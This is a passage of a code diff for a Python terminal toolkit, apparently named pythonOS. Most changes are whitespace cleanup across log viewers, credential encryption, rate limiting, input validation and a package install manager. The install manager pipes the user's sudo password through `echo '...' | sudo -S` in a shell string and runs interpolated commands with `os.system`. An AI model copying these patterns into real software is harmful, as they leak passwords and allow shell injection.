         print(f"{COLORS['3'][0]}No log files found{RESET}")
     else:
         for file_info in sorted(info['files'], key=lambda x: x['modified'], reverse=True):
             print(f"  {file_info['name']:30} {file_info['size_mb']:8.2f} MB  {file_info['modified']}")
-    
+
     print(f"\n{BOLD}Total Size:{RESET} {info['total_size_mb']:.2f} MB")
     print(f"{BOLD}Max Size per File:{RESET} {LOGGER.max_bytes / (1024*1024):.2f} MB")
     print(f"{BOLD}Backup Files Kept:{RESET} {LOGGER.backup_count}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _search_logs():
     """Search logs for pattern."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔍 SEARCH LOGS")
-    
+
     pattern = input(f"\n{BOLD}Enter search pattern: {RESET}").strip()
     if not pattern:
         return
-    
+
     analyzer = LogAnalyzer(LOGGER)
     results = analyzer.find_logs(pattern, count=50)
-    
+
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header(f"SEARCH RESULTS: {pattern}")
     print(f"\n{BOLD}Found {len(results)} matching logs:{RESET}\n")
-    
+
     for log in results[-20:]:
         level_color = {
             'DEBUG': COLORS['3'][0],
@@ -1409,53 +1477,53 @@ def _search_logs():
             'CRITICAL': COLORS['1'][0]
         }.get(log['level'], RESET)
         print(f"[{log['timestamp']}] {level_color}{log['level']:8}{RESET} [{log['component']}] {log['message'][:60]}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _export_logs_to_json():
     """Export logs to JSON file."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📤 EXPORT LOGS TO JSON")
-    
+
     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     export_path = os.path.expanduser(f"~/.pythonosrc/logs_export_{timestamp}.json")
-    
+
     try:
         LOGGER.export_logs(export_path, format="json")
         print(f"\n{COLORS['2'][0]}✅ Logs exported successfully{RESET}")
         print(f"   File: {export_path}")
     except Exception as e:
         print(f"\n{COLORS['1'][0]}❌ Export failed: {e}{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _clear_log_buffer():
     """Clear in-memory log buffer."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🗑️  CLEAR LOG BUFFER")
-    
+
     confirm = input(f"\n{BOLD}Clear all logs in memory? (yes/no): {RESET}").strip().lower()
-    
+
     if confirm == 'yes':
         LOGGER.clear_buffer()
         print(f"\n{COLORS['2'][0]}✅ Log buffer cleared{RESET}")
     else:
         print(f"\n{COLORS['3'][0]}Cancelled{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_component_health():
     """Show component health report."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🏥 COMPONENT HEALTH REPORT")
-    
+
     analyzer = LogAnalyzer(LOGGER)
     health = analyzer.get_component_health()
-    
+
     print(f"\n{BOLD}Component Health:{RESET}\n")
     print(f"{'Component':<25} {'Logs':>8} {'Errors':>8} {'Error Rate':>10}")
     print("-" * 55)
-    
+
     for component, stats in sorted(health.items(), key=lambda x: x[1]['error_rate'], reverse=True):
         rate = stats['error_rate']
         if rate == 0:
@@ -1466,9 +1534,9 @@ def _show_component_health():
             color = COLORS['4'][0]  # Yellow
         else:
             color = COLORS['1'][0]  # Red
-        
+
         print(f"{component:<25} {stats['total_logs']:>8} {stats['errors']:>8} {color}{rate:>9.1f}%{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def display_security_audit_menu():
@@ -1476,9 +1544,9 @@ def display_security_audit_menu():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🔒 SECURITY AUDIT CENTER")
-        
+
         c = get_current_color()
-        
+
         print(f"\n{BOLD}{c}Security Management Options:{RESET}")
         print(f" {BOLD}[1]{RESET} 📊 View Audit Log")
         print(f" {BOLD}[2]{RESET} 🔐 Encrypt Credentials File")
@@ -1489,9 +1557,9 @@ def display_security_audit_menu():
         print(f" {BOLD}[7]{RESET} 🧹 Purge Old Logs (30+ days)")
         print(f" {BOLD}[8]{RESET} 🔑 Generate Encryption Key")
         print(f" {BOLD}[0]{RESET} ↩️  Return to Command Center")
-        
+
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip()
-        
+
         if choice == '0':
             break
         elif choice == '1':
@@ -1518,15 +1586,15 @@ def encrypt_credentials_file():
     """Encrypt the credentials.json file."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔐 ENCRYPT CREDENTIALS FILE")
-    
+
     creds_file = os.path.expanduser("~/.pythonosrc/credentials.json")
     key_file = os.path.expanduser("~/.pythonosrc/encryption.key")
-    
+
     if not os.path.exists(creds_file):
         print(f"\n{COLORS['1'][0]}❌ Credentials file not found: {creds_file}{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     try:
         # Generate or load encryption key
         if not os.path.exists(key_file):
@@ -1538,25 +1606,25 @@ def encrypt_credentials_file():
         else:
             with open(key_file, 'rb') as f:
                 key = f.read()
-        
+
         # Read and encrypt credentials
         with open(creds_file, 'rb') as f:
             data = f.read()
-        
+
         cipher = Fernet(key)
         encrypted_data = cipher.encrypt(data)
-        
+
         # Backup original
         backup_file = f"{creds_file}.backup"
         shutil.copy2(creds_file, backup_file)
         os.chmod(backup_file, 0o600)
-        
+
         # Write encrypted file
         encrypted_file = f"{creds_file}.encrypted"
         with open(encrypted_file, 'wb') as f:
             f.write(encrypted_data)
         os.chmod(encrypted_file, 0o600)
-        
+
         # Log event
         AUDIT_LOGGER.log_event(
             "CREDENTIALS_ENCRYPTED",
@@ -1566,13 +1634,13 @@ def encrypt_credentials_file():
             "SUCCESS",
             f"Encrypted credentials file, backup at {backup_file}"
         )
-        
+
         print(f"\n{COLORS['2'][0]}✅ Credentials file encrypted successfully{RESET}")
         print(f"   Encrypted file:  {encrypted_file}")
         print(f"   Backup file:     {backup_file}")
         print(f"   Key file:        {key_file}")
         print(f"\n{COLORS['3'][0]}⚠️  Keep the encryption key safe!{RESET}")
-        
+
     except Exception as e:
         AUDIT_LOGGER.log_event(
             "CREDENTIALS_ENCRYPTION_FAILED",
@@ -1583,44 +1651,44 @@ def encrypt_credentials_file():
             str(e)
         )
         print(f"\n{COLORS['1'][0]}❌ Encryption failed: {e}{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def decrypt_credentials_file():
     """Decrypt the credentials.json file."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔓 DECRYPT CREDENTIALS FILE")
-    
+
     creds_encrypted = os.path.expanduser("~/.pythonosrc/credentials.json.encrypted")
     key_file = os.path.expanduser("~/.pythonosrc/encryption.key")
-    
+
     if not os.path.exists(creds_encrypted):
         print(f"\n{COLORS['1'][0]}❌ Encrypted credentials file not found: {creds_encrypted}{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     if not os.path.exists(key_file):
         print(f"\n{COLORS['1'][0]}❌ Encryption key not found: {key_file}{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     try:
         # Load key and decrypt
         with open(key_file, 'rb') as f:
             key = f.read()
-        
+
         with open(creds_encrypted, 'rb') as f:
             encrypted_data = f.read()
-        
+
         cipher = Fernet(key)
         decrypted_data = cipher.decrypt(encrypted_data)
-        
+
         # Write decrypted file
         creds_file = os.path.expanduser("~/.pythonosrc/credentials.json")
         with open(creds_file, 'wb') as f:
             f.write(decrypted_data)
         os.chmod(creds_file, 0o600)
-        
+
         # Log event
         AUDIT_LOGGER.log_event(
             "CREDENTIALS_DECRYPTED",
@@ -1630,10 +1698,10 @@ def decrypt_credentials_file():
             "SUCCESS",
             "Decrypted credentials file"
         )
-        
+
         print(f"\n{COLORS['2'][0]}✅ Credentials file decrypted successfully{RESET}")
         print(f"   Decrypted file: {creds_file}")
-        
+
     except Exception as e:
         AUDIT_LOGGER.log_event(
             "CREDENTIALS_DECRYPTION_FAILED",
@@ -1644,18 +1712,18 @@ def decrypt_credentials_file():
             str(e)
         )
         print(f"\n{COLORS['1'][0]}❌ Decryption failed: {e}{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def show_rate_limiter_status():
     """Show current rate limiter status."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🚫 RATE LIMITER STATUS")
-    
+
     c = get_current_color()
-    
+
     print(f"\n{BOLD}{c}Active Rate Limiters:{RESET}\n")
-    
+
     if not RATE_LIMITER.limiters:
         print(f"{COLORS['3'][0]}No rate limiters active{RESET}")
     else:
@@ -1665,43 +1733,43 @@ def show_rate_limiter_status():
             timestamps = limiter['timestamps']
             current_count = len(timestamps)
             capacity = limit - current_count
-            
+
             status_icon = f"{COLORS['2'][0]}✓{RESET}" if capacity > 0 else f"{COLORS['1'][0]}✗{RESET}"
             bar_length = 20
             filled = min(int((current_count / limit) * bar_length), bar_length)
             bar = "█" * filled + "░" * (bar_length - filled)
-            
+
             print(f"{status_icon} {operation:25} | {bar} | {current_count}/{limit} ({capacity} available)")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def show_failed_attempts():
     """Show failed security attempts."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("⚠️  FAILED SECURITY ATTEMPTS")
-    
+
     c = get_current_color()
-    
+
     failed_events = AUDIT_LOGGER.get_failed_attempts()
-    
+
     if not failed_events:
         print(f"\n{COLORS['2'][0]}✅ No failed attempts recorded{RESET}")
     else:
         print(f"\n{BOLD}{c}Total Failed Attempts: {len(failed_events)}{RESET}\n")
-        
+
         for event in failed_events[-50:]:
             timestamp = event['timestamp'].split('T')[1][:8]  # Just time
             print(f"[{timestamp}] {event['user']:15} | {event['action']:25} | {event['details']}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def reset_rate_limiters():
     """Reset all rate limiters."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔄 RESET RATE LIMITERS")
-    
+
     confirm = input(f"\n{BOLD}⚠️  Reset all rate limiters? (yes/no): {RESET}").strip().lower()
-    
+
     if confirm == 'yes':
         RATE_LIMITER.limiters.clear()
         AUDIT_LOGGER.log_event(
@@ -1715,38 +1783,38 @@ def reset_rate_limiters():
         print(f"\n{COLORS['2'][0]}✅ Rate limiters reset successfully{RESET}")
     else:
         print(f"\n{COLORS['3'][0]}Cancelled{RESET}")
-    
+
     time.sleep(1)
 
 def purge_old_logs():
     """Purge logs older than 30 days."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🧹 PURGE OLD LOGS")
-    
+
     log_dir = os.path.expanduser("~/.pythonosrc/logs")
-    
+
     if not os.path.exists(log_dir):
         print(f"\n{COLORS['3'][0]}Log directory not found: {log_dir}{RESET}")
         input(f"\n{BOLD}Press Enter to continue...{RESET}")
         return
-    
+
     try:
         cutoff_time = time.time() - (30 * 24 * 60 * 60)  # 30 days ago
         purged_count = 0
         total_size = 0
-        
+
         for filename in os.listdir(log_dir):
             filepath = os.path.join(log_dir, filename)
-            
+
             if os.path.isfile(filepath):
                 file_mtime = os.path.getmtime(filepath)
-                
+
                 if file_mtime < cutoff_time:
                     file_size = os.path.getsize(filepath)
                     os.remove(filepath)
                     purged_count += 1
                     total_size += file_size
-        
+
         AUDIT_LOGGER.log_event(
             "LOGS_PURGED",
             "system",
@@ -1755,27 +1823,27 @@ def purge_old_logs():
             "SUCCESS",
             f"Purged {purged_count} files, freed {total_size / 1024 / 1024:.2f} MB"
         )
-        
+
         print(f"\n{COLORS['2'][0]}✅ Purge completed{RESET}")
         print(f"   Files deleted:  {purged_count}")
         print(f"   Space freed:    {total_size / 1024 / 1024:.2f} MB")
-        
+
     except Exception as e:
         print(f"\n{COLORS['1'][0]}❌ Purge failed: {e}{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def generate_new_encryption_key():
     """Generate a new encryption key."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🔑 GENERATE ENCRYPTION KEY")
-    
+
     key_file = os.path.expanduser("~/.pythonosrc/encryption.key")
-    
+
     try:
         # Create directory if needed
         os.makedirs(os.path.dirname(key_file), exist_ok=True)
-        
+
         # Check if key already exists
         if os.path.exists(key_file):
             confirm = input(f"\n{BOLD}⚠️  Encryption key already exists. Overwrite? (yes/no): {RESET}").strip().lower()
@@ -1783,14 +1851,14 @@ def generate_new_encryption_key():
                 print(f"\n{COLORS['3'][0]}Cancelled{RESET}")
                 time.sleep(1)
                 return
-        
+
         # Generate new key
         key = Fernet.generate_key()
-        
+
         with open(key_file, 'wb') as f:
             f.write(key)
         os.chmod(key_file, 0o600)
-        
+
         AUDIT_LOGGER.log_event(
             "ENCRYPTION_KEY_GENERATED",
             "system",
@@ -1799,14 +1867,14 @@ def generate_new_encryption_key():
             "SUCCESS",
             "New encryption key generated"
         )
-        
+
         print(f"\n{COLORS['2'][0]}✅ New encryption key generated{RESET}")
         print(f"   Key file:  {key_file}")
         print(f"   Permissions:  600 (read/write for owner only)")
-        
+
     except Exception as e:
         print(f"\n{COLORS['1'][0]}❌ Key generation failed: {e}{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 # ================================================================================
@@ -1821,7 +1889,7 @@ def get_system_health_status():
     """Get overall system health status."""
     health = RESILIENCE_LOGGER.get_health_report()
     total_errors = health['total_errors']
-    
+
     if total_errors == 0:
         return "🟢 Excellent"
     elif total_errors < 5:
@@ -1845,7 +1913,7 @@ def get_recovery_rate(feature_name):
     recovery_stats = RESILIENCE_LOGGER.recovery_attempts.get(feature_name, {})
     attempts = recovery_stats.get('attempts', 0)
     successes = recovery_stats.get('successes', 0)
-    
+
     if attempts == 0:
         return 0
     return (successes / attempts) * 100
@@ -1853,15 +1921,15 @@ def get_recovery_rate(feature_name):
 def should_use_degraded_mode(feature_name):
     """Determine if feature should use degraded operation (cached data, reduced features)."""
     health = RESILIENCE_LOGGER.get_health_report()
-    
+
     # Use degraded mode if:
     # 1. Feature has failed > 2 times
     # 2. Feature recovery rate < 50%
     # 3. System has >20 total errors
-    
+
     error_count = health['error_types'].get(f"{feature_name}_Error", 0)
     recovery_rate = get_recovery_rate(feature_name)
-    
+
     return error_count > 2 or recovery_rate < 50 or health['total_errors'] > 20
 
 # ================================================================================
@@ -1874,21 +1942,21 @@ import hashlib
 
 class SecurityAuditLogger:
     """Comprehensive audit logging for security-critical operations."""
-    
+
     def __init__(self, log_dir="/tmp/pythonoslog", audit_log_name="security_audit.log"):
         self.log_dir = log_dir
         self.audit_log_file = os.path.join(log_dir, audit_log_name)
         self.events = deque(maxlen=1000)  # Keep last 1000 events
-        
+
         try:
             os.makedirs(log_dir, exist_ok=True)
         except Exception:
             pass
-    
+
     def log_event(self, event_type, user, action, resource="", status="SUCCESS", details=""):
         """Log security event with full context."""
         timestamp = datetime.now().isoformat()
-        
+
         event = {
             "timestamp": timestamp,
             "type": event_type,  # "LOGIN", "PASSWORD_CHANGE", "FILE_ACCESS", etc
@@ -1898,87 +1966,87 @@ class SecurityAuditLogger:
             "status": status,  # SUCCESS or FAILED
             "details": details  # Additional context
         }
-        
+
         self.events.append(event)
-        
+
         # Write to file
         try:
             log_entry = f"[{timestamp}] {event_type:15} | {user:15} | {action:20} | {resource:25} | {status:8} | {details}\n"
             with open(self.audit_log_file, 'a') as f:
                 f.write(log_entry)
         except Exception as e:
-            RESILIENCE_LOGGER.log(ErrorLevel.WARNING, f"Audit log write failed: {e}", 
+            RESILIENCE_LOGGER.log(ErrorLevel.WARNING, f"Audit log write failed: {e}",
                                  feature="SecurityAudit", error=e)
-    
+
     def get_recent_events(self, count=50, event_type=None):
         """Get recent security events, optionally filtered by type."""
         events = list(self.events)
         if event_type:
             events = [e for e in events if e['type'] == event_type]
         return events[-count:]
-    
+
     def get_failed_attempts(self, user=None):
         """Get failed security attempts."""
         failed = [e for e in self.events if e['status'] == 'FAILED']
         if user:
             failed = [e for e in failed if e['user'] == user]
         return failed
-    
+
     def get_file_access_log(self, resource):
         """Get all access logs for a specific resource."""
         return [e for e in self.events if e['resource'] == resource and e['type'] == 'FILE_ACCESS']
 
 class RateLimiter:
     """Rate limiting for sensitive operations to prevent abuse."""
-    
+
     def __init__(self, max_attempts=5, time_window=300):  # 5 attempts per 5 minutes
         self.max_attempts = max_attempts
         self.time_window = time_window
         self.attempts = defaultdict(deque)  # {identifier: deque of timestamps}
-    
+
     def is_allowed(self, identifier):
         """Check if operation is allowed for this identifier."""
         now = time.time()
         attempts = self.attempts[identifier]
-        
+
         # Remove old attempts outside the time window
         while attempts and attempts[0] < now - self.time_window:
             attempts.popleft()
-        
+
         # Check if under limit
         if len(attempts) < self.max_attempts:
             attempts.append(now)
             return True, len(attempts)
-        
+
         return False, self.max_attempts
-    
+
     def get_remaining(self, identifier):
         """Get remaining attempts for this identifier."""
         now = time.time()
         attempts = self.attempts[identifier]
-        
+
         # Clean old attempts
         while attempts and attempts[0] < now - self.time_window:
             attempts.popleft()
-        
+
         return self.max_attempts - len(attempts)
-    
+
     def reset(self, identifier):
         """Reset rate limit for identifier (after successful operation)."""
         self.attempts[identifier].clear()
-    
+
     def reset_all(self):
         """Reset all rate limits."""
         self.attempts.clear()
 
 class CredentialEncryptor:
     """Encrypts and decrypts credentials for secure storage."""
-    
+
     def __init__(self, key_file=None):
         self.key_file = key_file or os.path.expanduser("~/.pythonOS/.enc_key")
         self.cipher = None
         self._load_or_create_key()
-    
+
     def _load_or_create_key(self):
         """Load encryption key or create new one."""
         try:
@@ -1992,13 +2060,13 @@ class CredentialEncryptor:
                 with open(self.key_file, 'wb') as f:
                     f.write(key)
                 os.chmod(self.key_file, 0o600)  # Secure permissions
-            
+
             self.cipher = Fernet(key)
         except Exception as e:
             RESILIENCE_LOGGER.log(ErrorLevel.ERROR, f"Failed to initialize encryption: {e}",
                                  feature="Encryption", error=e)
             self.cipher = None
-    
+
     def encrypt(self, data):
         """Encrypt data (string or dict)."""
         try:
@@ -2006,7 +2074,7 @@ class CredentialEncryptor:
                 data = json.dumps(data)
             if isinstance(data, str):
                 data = data.encode()
-            
+
             if self.cipher:
                 encrypted = self.cipher.encrypt(data)
                 return encrypted.decode()
@@ -2015,13 +2083,13 @@ class CredentialEncryptor:
             RESILIENCE_LOGGER.log(ErrorLevel.ERROR, f"Encryption failed: {e}",
                                  feature="Encryption", error=e)
             return None
-    
+
     def decrypt(self, encrypted_data):
         """Decrypt data back to original format."""
         try:
             if isinstance(encrypted_data, str):
                 encrypted_data = encrypted_data.encode()
-            
+
             if self.cipher:
                 decrypted = self.cipher.decrypt(encrypted_data)
                 return decrypted.decode()
@@ -2033,77 +2101,77 @@ class CredentialEncryptor:
 
 class InputValidator:
     """Comprehensive input validation to prevent injection attacks."""
-    
+
     # Safe characters for different contexts
     SAFE_ALPHANUMERIC = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-")
     SAFE_FILENAME = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/")
     SAFE_URL = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/:?&=")
-    
+
     @staticmethod
     def validate_username(username, min_length=3, max_length=32):
         """Validate username format."""
         if not username or len(username) < min_length or len(username) > max_length:
             return False, f"Username must be {min_length}-{max_length} characters"
-        
+
         if not all(c in InputValidator.SAFE_ALPHANUMERIC or c == '@' for c in username):
             return False, "Username contains invalid characters"
-        
+
         return True, "Valid"
-    
+
     @staticmethod
     def validate_password(password, min_length=8):
         """Validate password strength."""
         if not password or len(password) < min_length:
             return False, f"Password must be at least {min_length} characters"
-        
+
         has_upper = any(c.isupper() for c in password)
         has_lower = any(c.islower() for c in password)
         has_digit = any(c.isdigit() for c in password)
-        
+
         if not (has_upper and has_lower and has_digit):
             return False, "Password must contain uppercase, lowercase, and digits"
-        
+
         return True, "Valid"
-    
+
     @staticmethod
     def validate_filename(filename, max_length=255):
         """Validate filename to prevent directory traversal."""
         if not filename or len(filename) > max_length:
             return False, f"Filename invalid or too long (max {max_length})"
-        
+
         # Prevent directory traversal
         if ".." in filename or filename.startswith("/"):
             return False, "Filename contains invalid path sequences"
-        
+
         if not all(c in InputValidator.SAFE_FILENAME for c in filename):
             return False, "Filename contains invalid characters"
-        
+
         return True, "Valid"
-    
+
     @staticmethod
     def validate_url(url, max_length=2048):
         """Validate URL format."""
         if not url or len(url) > max_length:
             return False, "URL invalid or too long"
-        
+
         if not url.startswith(('http://', 'https://')):
             return False, "URL must start with http:// or https://"
-        
+
         return True, "Valid"
-    
+
     @staticmethod
     def validate_email(email, max_length=254):
         """Validate email format."""
         import re
         if not email or len(email) > max_length:
             return False, "Email invalid or too long"
-        
+
         pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
         if not re.match(pattern, email):
             return False, "Email format invalid"
-        
+
         return True, "Valid"
-    
+
     @staticmethod
     def sanitize_path(path):
         """Remove potentially dangerous characters from file path."""
@@ -2112,7 +2180,7 @@ class InputValidator:
         for char in dangerous_chars:
             path = path.replace(char, '')
         return path
-    
+
     @staticmethod
     def sanitize_command(command):
         """Sanitize command to prevent shell injection."""
@@ -2135,7 +2203,7 @@ def require_rate_limit(limiter, identifier):
         @wraps(func)
         def wrapper(*args, **kwargs):
             allowed, attempts = limiter.is_allowed(identifier)
-            
+
             if not allowed:
                 remaining = limiter.get_remaining(identifier)
                 AUDIT_LOGGER.log_event(
@@ -2146,7 +2214,7 @@ def require_rate_limit(limiter, identifier):
                     details=f"Max attempts exceeded"
                 )
                 raise Exception(f"Rate limit exceeded. Try again in a moment. ({remaining} remaining)")
-            
+
             try:
                 result = func(*args, **kwargs)
                 limiter.reset(identifier)
@@ -2160,7 +2228,7 @@ def require_rate_limit(limiter, identifier):
                     details=str(e)
                 )
                 raise
-        
+
         return wrapper
     return decorator
 
@@ -2183,9 +2251,9 @@ def require_input_validation(*validators):
                             details=message
                         )
                         raise ValueError(f"Invalid {key}: {message}")
-            
+
             return func(*args, **kwargs)
-        
+
         return wrapper
     return decorator
 
@@ -2215,7 +2283,7 @@ def log_security_event(event_type, resource=""):
                     details=str(e)
                 )
                 raise
-        
+
         return wrapper
     return decorator
 
@@ -2277,13 +2345,13 @@ MAX_DISPLAYED_FORMATS = len(SUPPORTED_AUDIO_FORMATS)
 
 class GlobalCredentialManager:
     """Manages and caches login credentials with encryption for all downloads."""
-    
+
     def __init__(self):
         self.credentials = {}  # {service: {"username": "...", "password": "...", "timestamp": "..."}}
         self.cred_file = os.path.expanduser("~/.pythonOS/credentials.json")
         self.logged_in_services = set()
         self._load_credentials()
-        
+
     @log_security_event("CREDENTIAL_LOAD", "credentials.json")
     def _load_credentials(self):
         """Load and decrypt credentials from disk."""
@@ -2291,7 +2359,7 @@ class GlobalCredentialManager:
             if os.path.exists(self.cred_file):
                 with open(self.cred_file, 'r') as f:
                     encrypted_data = f.read()
-                
+
                 # Decrypt credentials
                 decrypted = CREDENTIAL_ENCRYPTOR.decrypt(encrypted_data)
                 if decrypted:
@@ -2316,20 +2384,20 @@ class GlobalCredentialManager:
                 details=str(e)
             )
             self.credentials = {}
-    
+
     @log_security_event("CREDENTIAL_SAVE", "credentials.json")
     def _save_credentials(self):
         """Encrypt and save credentials to disk."""
         try:
             os.makedirs(os.path.dirname(self.cred_file), exist_ok=True)
-            
+
             # Encrypt credentials
             encrypted = CREDENTIAL_ENCRYPTOR.encrypt(self.credentials)
             if encrypted:
                 with open(self.cred_file, 'w') as f:
                     f.write(encrypted)
                 os.chmod(self.cred_file, 0o600)  # Secure permissions
-                
+
                 AUDIT_LOGGER.log_event(
                     "CREDENTIAL_SAVE",
                     os.getenv("USER", "unknown"),
@@ -2346,7 +2414,7 @@ class GlobalCredentialManager:
                 status="FAILED",
                 details=str(e)
             )
-    
+
     @require_rate_limit(RATE_LIMITER_LOGIN, "credential_add")
     @require_input_validation(("username", InputValidator.validate_username))
     @log_security_event("CREDENTIAL_ADD")
@@ -2357,14 +2425,14 @@ class GlobalCredentialManager:
         is_valid, msg = InputValidator.validate_username(username)
         if not is_valid:
             raise ValueError(f"Invalid username: {msg}")
-        
+
         if password is None:
             password = getpass.getpass(f"Enter password for {service}: ")
-        
+
         is_valid, msg = InputValidator.validate_password(password)
         if not is_valid:
             raise ValueError(f"Invalid password: {msg}")
-        
+
         import time
         self.credentials[service] = {
             "username": username,
@@ -2373,7 +2441,7 @@ class GlobalCredentialManager:
         }
         self.logged_in_services.add(service)
         self._save_credentials()
-        
+
         AUDIT_LOGGER.log_event(
             "CREDENTIAL_ADD",
             os.getenv("USER", "unknown"),
@@ -2382,7 +2450,7 @@ class GlobalCredentialManager:
             status="SUCCESS"
         )
         return True
-    
+
     @log_security_event("CREDENTIAL_RETRIEVE")
     def get_credentials(self, service):
         """Retrieve credentials for a service."""
@@ -2396,11 +2464,11 @@ class GlobalCredentialManager:
                 status="SUCCESS"
             )
         return creds
-    
+
     def is_logged_in(self, service):
         """Check if logged into a service."""
         return service in self.logged_in_services
-    
+
     @log_security_event("CREDENTIAL_CLEAR")
     def clear_credentials(self, service=None):
         """Clear credentials for a service or all services."""
@@ -2427,11 +2495,11 @@ class GlobalCredentialManager:
                 details=f"Cleared {count} credentials"
             )
         self._save_credentials()
-    
+
     def list_logged_in(self):
         """List all services with stored credentials."""
         return list(self.logged_in_services)
-    
+
     def get_auth_header(self, service):
         """Get HTTP Authorization header for a service."""
         creds = self.get_credentials(service)
@@ -2441,7 +2509,7 @@ class GlobalCredentialManager:
             encoded = base64.b64encode(user_pass.encode()).decode()
             return {"Authorization": f"Basic {encoded}"}
         return {}
-    
+
     def show_credential_status(self):
         """Display current login status."""
         print(f"\n{BOLD}📋 Logged-In Services (Encrypted):{RESET}")
@@ -2460,12 +2528,12 @@ class GlobalCredentialManager:
 
 class UniversalInstallManager:
     """AI-powered install manager supporting all known operating systems."""
-    
+
     def __init__(self):
         self.install_log = []
         self.os_info = self._detect_system()
         self.privilege_level = self._check_privileges()
-        
+
     def _detect_system(self):
         """Comprehensive OS and architecture detection."""
         info = {
@@ -2475,7 +2543,7 @@ class UniversalInstallManager:
             "release": platform.release(),
             "processor": platform.processor(),
         }
-        
+
         # Arch detection
         arch = info["architecture"]
         if arch in ["x86_64", "amd64"]:
@@ -2499,7 +2567,7 @@ class UniversalInstallManager:
         else:
             info["arch_type"] = arch
             info["bits"] = 64
-        
+
         # OS-specific detection
         if info["platform"] == "Windows":
             info["os_key"] = "windows"
@@ -2517,7 +2585,7 @@ class UniversalInstallManager:
                 osr = self._read_os_release()
                 os_id = (osr.get("ID") or "").lower()
                 like = (osr.get("ID_LIKE") or "").lower()
-                
+
                 if "kali" in os_id or "kali" in like:
                     info["os_key"] = "kali"
                 elif os_id in ["ubuntu", "debian", "linuxmint", "pop"] or "debian" in like:
@@ -2539,7 +2607,7 @@ class UniversalInstallManager:
         else:
             info["os_key"] = info["platform"].lower()
             info["os_family"] = "unknown"
-        
+
         # Check for IoT/Embedded systems
         if "esp" in info.get("os_key", "").lower() or "esp32" in info.get("architecture", "").lower():
             info["device_type"] = "esp32"
@@ -2549,9 +2617,9 @@ class UniversalInstallManager:
             info["device_type"] = "riscv"
         else:
             info["device_type"] = "standard"
-        
+
         return info
-    
+
     def _read_os_release(self):
         """Read /etc/os-release for Linux system identification."""
         data = {}
@@ -2564,7 +2632,7 @@ class UniversalInstallManager:
         except Exception:
             pass
         return data
-    
+
     def _check_privileges(self):
         """Check current privilege level."""
         if platform.system() == "Windows":
@@ -2575,7 +2643,7 @@ class UniversalInstallManager:
                 return "user"
         else:
             return "root" if os.geteuid() == 0 else "user"
-    
+
     def _get_sudo_prefix(self, require_root=False):
         """Get sudo prefix and handle privilege escalation."""
         if require_root:
@@ -2591,28 +2659,28 @@ class UniversalInstallManager:
                 else:
                     return f"echo '{password}' | sudo -S " if password else "sudo "
         return ""
-    
+
     def install_package(self, package_info, tool_name=""):
         """Universal package installer with AI decision logic."""
         os_key = self.os_info["os_key"]
         arch_type = self.os_info["arch_type"]
-        
+
         # Get best install method based on OS and package
         install_cmd = self._select_best_install_method(package_info, os_key, arch_type)
-        
+
         if not install_cmd:
             msg = f"[✗] No compatible install method for {os_key}/{arch_type}"
             self._log_install(tool_name, install_cmd, False, msg)
             return False
-        
+
         # Check if needs privilege escalation
         needs_root = any(x in install_cmd for x in ["sudo", "apt", "dnf", "pacman", "apk"])
         if needs_root:
             install_cmd = self._get_sudo_prefix(require_root=True) + install_cmd
-        
+
         print(f"\033[96m[→] Installing {tool_name}: {install_cmd[:80]}...\033[0m")
 
-        
+
         try:
             result = os.system(install_cmd)
             success = result == 0
@@ -2623,11 +2691,11 @@ class UniversalInstallManager:
             msg = f"Installation error: {str(e)}"
             self._log_install(tool_name, install_cmd, False, msg)
             return False
-    
+
     def _select_best_install_method(self, package_info, os_key, arch_type):
         """AI logic to select best install method."""
         # Priority order: native package manager > language-specific > binary download > source build
-        
+
         # Check for OS-specific command
         if isinstance(package_info, dict):
             if f"{os_key}_{arch_type}" in package_info:
@@ -2642,9 +2710,9 @@ class UniversalInstallManager:
                 return package_info["linux"]
         elif isinstance(package_info, str):
             return package_info
-        
+
         return None
-    
+
     def _log_install(self, tool_name, command, success, message):
         """Log installation attempt."""
         entry = {
@@ -2657,7 +2725,7 @@ class UniversalInstallManager:
             "arch": self.os_info["arch_type"],
         }
         self.install_log.append(entry)
-        
+
         # Save to log file
         try:
             log_dir = os.path.expanduser("~/.pythonOS/install_logs")
